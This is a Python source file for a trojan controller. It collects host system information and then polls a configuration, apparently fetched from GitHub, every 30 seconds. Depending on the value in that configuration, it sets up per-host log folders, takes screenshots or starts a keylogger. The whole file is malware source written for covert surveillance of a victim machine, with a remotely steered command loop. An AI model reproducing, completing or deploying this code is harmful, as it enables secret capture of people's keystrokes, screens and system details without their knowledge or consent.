import asyncio
import json
import os
from time import sleep
from mod1_sysinfo import SysInfo
from mod2_screenshotter import Screenshotter
from mod3_keylogger import Keylogger
from get_config_from_github import Config

class Trojan:
    def __init__(self):
        self.get_config()
        self.host_info = SysInfo().fetch_info()
        self.screenshotter = Screenshotter(self.host_info['id'])
        self.keylogger = Keylogger(self.host_info['id'])
        
        while True:
            self.controller()
            sleep(30)

    def get_config(self):
        self.config = Config().get_config()

    def initiate_host(self):
        host_id = self.host_info['id']
        
        script_dir = os.path.dirname(os.path.realpath(__file__))

        log_path = os.path.join(script_dir, "..", "logs", host_id)
        os.makedirs(log_path, exist_ok=True)
            
        with open(os.path.join(log_path, "sysinfo.json"), "w") as outfile:
            json.dump(self.host_info, outfile, indent=4)

        os.makedirs(os.path.join(log_path, "screenshots"), exist_ok=True)
        os.makedirs(os.path.join(log_path, "keylogs"), exist_ok=True)
        os.makedirs(os.path.join(log_path, "network"), exist_ok=True)

    
    def controller(self):
        module = self.config['module']
        self.reset_modules()

        if module == 1:
            self.initiate_host()

        if module == 2:
            self.screenshotter.take_ss()

        if module == 3:
            self.keylogger.start()

        if module == 4:
            pass

    def reset_modules(self):
        self.keylogger.stop()



if __name__ == '__main__':
    trojan = Trojan()
    trojan.initiate_host()
